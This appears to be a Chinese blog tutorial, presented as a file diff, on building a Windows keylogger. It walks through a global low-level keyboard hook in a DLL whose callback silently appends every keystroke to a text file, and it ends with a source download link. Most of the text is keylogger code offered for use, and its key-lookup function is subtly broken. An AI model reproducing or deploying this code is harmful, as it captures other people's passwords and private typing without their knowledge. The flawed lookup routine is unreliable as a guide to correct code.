@@ -1,0 +1,233 @@
+说起键盘记录，想必很多朋友都用过网上流传的一些键盘记录软件吧，但是有没有想过自己写一个呢？也许你会想：会不会很复杂啊？我可以很负责的告诉你，写键盘记录是很简单的。你所需要的仅仅是懂得一些C语言的DLL编写，剩下的就是仔细的研究下MSDN上面的函数和一些耐心啦。下面就让我这小菜带大家来写属于自己的键盘记录器吧。
+
+说道键盘记录，免不掉要说一下Windows的HOOK函数。通过搜索引擎，我们会得到好多关于hook的定义，这里就用比较通俗易懂的话来说下什么是hook。
+
+Hook可以说就是一个间谍，假如你想要给你远在马来西亚的女朋友写一封信，你可以直接把写好的信投到邮局，然后由邮递员送到你女朋友手里。但是当hook这个阴险的间谍出现时，事情就完全发生了变化。Hook会赶在邮递员把你的信送出去之前进行一些你并不想要的操作，这样一来，你的信可能被修改、复制，甚至直接销毁。
+
+那么按键消息也就像你的那封信一样，当在系统中安装了hook之后，就可以截取所有的键盘消息，从而对这些消息进行操作，还可以决定是否继续将这个消息传送到另外一个正在等候的程序。
+
+通过上面简单的比喻，我想大家应该对hook有了一个简单的认识，下面我们来说下hook的分类以及一些具体的使用。
+
+Hook可以分为下面几种，不同类型的钩子有着不同的作用：
+
+WH_CALLWNDPROC
+
+WH_CALLWNDPROCRET
+
+WH_CBT
+
+WH_DEBUG
+
+ WH_KEYBOARD_LL
+
+WH_MOUSE
+
+WH_MOUSE_LL
+
+WH_MSGFILTER
+
+ 
+WH_FOREGROUNDIDLE
+
+WH_GETMESSAGE
+
+WH_JOURNALPLAYBACK
+
+WH_JOURNALRECORD
+
+ WH_KEYBOARD
+
+WH_SHELL
+
+WH_SYSMSGFILTER
+
+
+
+
+ 
+
+这么多的钩子类型，我们在这一不去进行一一的解释，仅仅拿出我们需要的两个来说一下，其他的大家可以参阅MSDN上的SetWindowsHookEx函数的定义。
+
+这里与我们键盘记录有关系的两个钩子类型是：WH_KEYBOARD和WH_KEYBOARD_LL，这两个都是键盘钩子，他们有什么区别呢？MSDN上面说的是WH_KEYBOARD会在应用程序调用GetMessage 或者 PeekMessage函数并且有键盘消息（按下或者释放）的时候会调用相应的函数进行处理，WH_KEYBOARD_LL这个类型是只要有键盘输入事件的发生，它都会将键盘消息传给相应函数，而在我自己试验的时候发现WH_KEYBOARD类型的钩子只记录本程序的按键消息，对发送到其他程序的按键消息不予以响应。所以，下面我们就用WH_KEYBOARD_LL这个类型的底层键盘钩子，来记录计算机上所有的键盘输入。
+
+下面我们看一下钩子使用：
+首先我们要定义一个钩子的回调函数，这样当相应的系统消息传送给钩子的时候就会由这个回调函数进行处理。回调函数书写必须按照下面的语法：
+LRESULT CALLBACK HookProc
+(
+     int nCode, 
+         WPARAM wParam, 
+         LPARAM lParam
+);
+HookProc是你自己定义的名字。nCode参数是Hook代码，Hook子程使用这个参数来确定任务。这个参数的值依赖于Hook类型，每一种Hook都有自己的Hook代码特征字符集。wParam和lParam参数的值依赖于Hook代码，但是它们的典型值是包含了关于发送或者接收消息的信息。
+
+我们这里用到的是WH_KEYBOARD_LL对应的回调函数LowLevelKeyboardProc，他的定义如下：
+LRESULT CALLBACK LowLevelKeyboardProc(
+int nCode,     // hook code
+WPARAM wParam, // message identifier
+LPARAM lParam // message data
+);
+这里的wParam指的是键盘消息的标识，它的值可以是WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, 或者 WM_SYSKEYUP.而lParam则指向一个KBDLLHOOKSTRUCT结构体，下面是KBDLLHOOKSTRUCT结构体的定义：
+typedef struct tagKBDLLHOOKSTRUCT {
+    DWORD     vkCode;　//virtual-key
+    DWORD     scanCode;
+    DWORD     flags;
+    DWORD     time;
+    ULONG_PTR dwExtraInfo;
+} KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT;
+
+知道了上面的这些，我们就可以开始写我们的回调函数了：
+
+LRESULT CALLBACK LowLevelKeyboardProc(
+int nCode,
+WPARAM wParam,
+LPARAM lParam
+)
+{
+    KBDLLHOOKSTRUCT* pStruct = (KBDLLHOOKSTRUCT*)lParam;
+    LPCSTR log=GetKeyName(pStruct->vkCode);
+    if (wParam==WM_KEYDOWN)
+    {
+        FILE *fl=fopen("C:\\zaroty.TXT","a+");
+        fprintf(fl,"%s %s",log," ");
+        fclose(fl);
+    }
+    return CallNextHookEx( CuhHook, nCode, wParam, lParam );
+}
+上面这段代码的意思就是当调用回调函数时，将虚拟码通过GetKeyName函数（后面会定义）转换为我们可以看懂的内容，然后当接收到键盘按下（WM_KEYDOWN）的消息时，就打开C:\\zaroty.TXT并将转换来的按键信息写入其中。写入完毕之后为了保证这个按键消息可以继续传递下去，调用CallNextHookEx函数将其传入消息队列。下面是CallNextHookEx函数的定义：
+
+LRESULT CallNextHookEx(
+HHOOK hhk,      // 当前钩子的句柄，当我们安装钩子的时候会得到这个句柄。
+int nCode,      // hook code passed to hook procedure
+WPARAM wParam, // value passed to hook procedure
+LPARAM lParam   // value passed to hook procedure
+);
+
+这样我们的回调函数就写完了，下面要做的就是安装钩子，让我们的回调函数起到作用。这时我们就要用到了SetWindowsHookEx函数，它的原型为：
+
+HHOOK SetWindowsHookEx(
+int idHook,        // 钩子类型，我们这里是WH_KEYBOARD_LL
+HOOKPROC lpfn,     // 钩子的回调函数，即上面的LowLevelKeyboardProc
+HINSTANCE hMod,    // 指向调用钩子的程序的句柄，后面会讲到。
+DWORD dwThreadId   // thread identifier
+);
+
+按照上面的结构来安装我们自己的钩子
+
+DLLEXPORT BOOL StartHook()
+{
+    CuhHook=SetWindowsHookEx(WH_KEYBOARD_LL,LowLevelKeyboardProc,g_hModule,0);
+    if (CuhHook!=NULL)
+    {
+        return 1;
+    }
+    else
+    {
+        return 0;
+    }
+}
+
+下面是卸载钩子的函数：
+
+DLLEXPORT BOOL StopHook()
+{
+    if (UnhookWindowsHookEx(CuhHook))
+    {
+        return 1;
+    }
+    else
+    {
+        return 0;
+    }
+}
+因为我们要记录所有的键盘消息，所以需要的是一个系统全局钩子，那么我们就要将所需要的钩子函数写到一个外部的DLL里面，然后由其他的应用程序调用DLL内的一些函数来实现（为什么要这么麻烦？我也不知道，微软规定的 :-） ）。还不懂得DLL编写的朋友可以去参看一下这两篇转载的文章：
+
+http://hi.baidu.com/zaroty/blog/item/575bc6caa8832280c91768f2.html
+
+http://hi.baidu.com/zaroty/blog/item/a64366fa4586fe8f9e5146f2.html
+
+下面我们开始编写DLL
+
+首先，打开VC6.0 新建一个空的Win32 Dynamic-Link Library工程，然后新建一个keyhook.c，写入如下代码：
+
+////////////////////////////////////
+//keyhook.c
+//作用：DLL主文件
+//作者:zaroty
+//时间：2008年9月9日0:54:39
+//博客：http://hi.badu.com/zaroty
+///////////////////////////////////
+#define _WIN32_WINNT 0x0500 //底层钩子需要设置系统版本号
+#include <windows.h>
+#include <stdio.h>
+#include "keyhook.h"
+#include "vKey.h"
+HHOOK CuhHook=NULL;
+HANDLE g_hModule;
+BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved) 
+
+{
+    switch(dwReason)
+    {
+    case DLL_PROCESS_ATTACH:
+       g_hModule = (HINSTANCE)hModule;
+       break;
+    case DLL_PROCESS_DETACH:
+        g_hModule=NULL;
+        break;
+    }
+    return TRUE;
+}
+
+上面的内容包含了所必需的头文件和一个DllMain函数，在DllMain中我们将调用ＤＬＬ的程序的句柄保存为g_hModule，以方便SetWindowsHookEx函数使用。然后我们把上面的回调函数以及安装钩子和卸载钩子函数的代码都粘贴进去，我们的　.ｃ文件就写到这里了。
+
+下面我们添加一个头文件，声明我们需要导出的函数，方便其他程序的隐式调用。
+
+////////////////////////////////////
+//keyhook.h
+//作用：DLL头文件，声明导出的函数
+//作者:zaroty
+//时间：2008年9月9日0:54:39
+//博客：http://hi.badu.com/zaroty
+///////////////////////////////////
+#define DLLEXPORT __declspec(dllexport)
+DLLEXPORT BOOL StartHook();
+DLLEXPORT BOOL StopHook();
+
+写到这里，我们的程序基本上就写完了，仔细想想，我们是不是忘掉了什么东西呢？对，是那个转换虚拟码为按键信息的函数GetKeyName。下面我们新建一个头文件，将这个函数的内容写进去：
+struct VKeyInfo{
+    USHORT VKey;
+    LPCSTR VKname;
+};
+#define AddVKey(VK, VKName)   {(VK), (VKName)}
+struct VKeyInfo vkey[]=
+{
+        AddVKey(VK_BACK, "BACKSPACE"),
+        AddVKey(VK_TAB, "TAB"),
+        AddVKey(VK_CLEAR, "CLEAR"),
+        AddVKey(VK_RETURN, "ENTER"),
+//省略大量的代码，具体可以下载源码查看。    
+};
+
+LPCSTR GetKeyName(USHORT VKey)
+{
+    int i;
+    for(i = 0; i<sizeof(vkey); i++)
+    {
+        if(VKey == vkey[i].VKey)
+            return vkey[i].VKname;
+    }
+} 
+
+到此为止，我们的DLL程序就编写完毕了，下面要做的仅仅是编写一个简单的程序，调用DLL里面的StartHook函数就可以了，不会调用的朋友可以看一下上面提到的DLL编写教程。
+
+本人菜鸟，没有上过几天学，文章写得比较乱，希望大家不要见怪。有什么疑问或者建议欢迎大家指出，谢谢！
+
+相关链接：
+
+DLL编写教程一
+
+DLL编写教程二
+
+源代码下载：
+
+http://www.mediafire.com/?654pev44nrd
